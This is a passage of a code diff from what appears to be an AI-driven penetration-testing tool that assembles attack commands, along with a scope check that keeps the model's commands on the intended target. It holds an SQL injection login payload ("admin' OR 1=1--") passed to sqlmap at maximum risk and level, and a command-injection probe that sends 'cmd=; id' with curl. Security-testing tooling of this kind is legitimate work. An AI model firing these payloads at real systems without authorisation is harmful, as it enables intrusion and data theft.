-                # JuiceShop login is JSON POST; avoid brittle escaping in --data.
-                login_data = json.dumps({"email": "admin' OR 1=1--*", "password": "x"})
-                cmd_list.append(
-                    f"sqlmap -u {shlex.quote(vuln_url)} --method POST "
-                    f"--headers={shlex.quote('Content-Type: application/json')} "
-                    f"--data={shlex.quote(login_data)} "
-                    f"--batch --dbs --risk=3 --level=5"
-                )
-            else:
-                cmd_list.append(f'sqlmap -u "{vuln_url}" --batch --dbs --risk=3 --level=5')
+            cmd_list.append(f'sqlmap -u "{vuln_url}" --batch --dbs --risk=3 --level=5')
         if is_cmdi:
             cmd_list.append(f'curl -s "{vuln_url}" --data "cmd=; id"')
             cmd_list.append(
@@ -9105,7 +9276,7 @@ Continue the assessment - provide the next commands."""
             cmd_targets.discard("")
             if cmd_targets:
                 # Treat aliases as equivalent to avoid false pivot blocks when the model mixes
-                # `juiceshop` and its resolved IP (e.g., 172.21.0.x) in the same command.
+                # a hostname and its resolved IP in the same command.
                 tgt_equiv = {tgt}
                 try:
                     if self.target_aliases:
@@ -9148,7 +9319,7 @@ Continue the assessment - provide the next commands."""
             cmd_targets = {self._normalize_target_token(t) for t in self._extract_targets_from_command(cmd) if t}
             cmd_targets.discard("")
 
-            # Treat known aliases as equivalent (e.g., juiceshop <-> 172.21.0.x).
+            # Treat known aliases as equivalent (e.g., hostname <-> resolved IP).
             tgt_equiv = {tgt}
             try:
                 if self.target_aliases:
